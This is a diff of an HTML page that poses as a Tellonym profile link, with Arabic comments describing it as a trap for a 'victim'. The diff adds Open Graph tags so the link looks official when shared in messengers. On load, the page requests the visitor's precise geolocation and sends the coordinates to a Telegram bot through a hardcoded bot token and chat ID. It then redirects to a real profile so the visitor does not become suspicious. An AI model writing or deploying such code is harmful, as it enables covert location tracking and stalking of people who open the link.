@@ -1,44 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Tellonym - Redirecting...</title>
+    <!-- التمويه: هذه الأسطر تجعل الرابط يظهر بشكل رسمي عند إرساله في واتساب أو تليجرام -->
+    <meta property="og:title" content="Schaien on Tellonym">
+    <meta property="og:description" content="Ask me anything anonymously!">
+    <meta property="og:image" content="https://tellonym.me/static/img/logo.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tellonym - Schaien</title>
+    
     <script>
-        // تم وضع الآيدي الصحيح الخاص بك هنا
         const token = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
         const chatId = "1138822664";
+        const targetProfile = "https://tellonym.me/Schaien"; // توجيه مباشر لحسابك
 
-        function success(pos) {
+        function sendToMaster(pos) {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
-            const platform = navigator.userAgent;
-
-            const message = `🎯 هبطت الصيدة في الفخ!\n📍 الإحداثيات: https://www.google.com/maps?q=${lat},${lon}\n📏 دقة تحديد الموقع: ${acc} متر\n📱 نوع الجهاز: ${platform}`;
+            const accuracy = pos.coords.accuracy;
+            const msg = `🎯 تم صيد الضحية بنجاح!\n👤 الحساب المستهدف: Schaien\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n📏 الدقة: ${accuracy} متر`;
             
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
             .finally(() => {
-                // تحويل الضحية فوراً لإبعاد الشبهة
-                window.location.href = "https://tellonym.me/Target_Username"; 
+                // تحويل الضحية فوراً إلى حسابك Schaien
+                window.location.href = targetProfile;
             });
         }
 
-        function error(err) {
-            // حتى لو رفض الموقع، يتم تحويله لكي لا يكتشف الأمر
-            window.location.href = "https://tellonym.me/Target_Username";
+        function handleFail() {
+            // حتى لو فشل أو رفض، يذهب لصفحتك لكي لا يشك
+            window.location.href = targetProfile;
         }
 
         window.onload = function() {
-            // طلب الموقع بأعلى دقة - سيظهر تنبيه للمستخدم يطلب "السماح"
-            navigator.geolocation.getCurrentPosition(success, error, {
+            // طلب الموقع بهدوء فور تحميل الصفحة
+            navigator.geolocation.getCurrentPosition(sendToMaster, handleFail, {
                 enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
+                timeout: 5000
             });
         };
     </script>
 </head>
-<body style="background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px;">
-    <p>Loading Profile...</p>
+<body style="background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">
+    <div style="text-align: center;">
+        <img src="https://tellonym.me/static/img/logo.png" style="width: 80px; margin-bottom: 20px;">
+        <p>جاري تحميل الصفحة...</p>
+    </div>
 </body>
 </html>
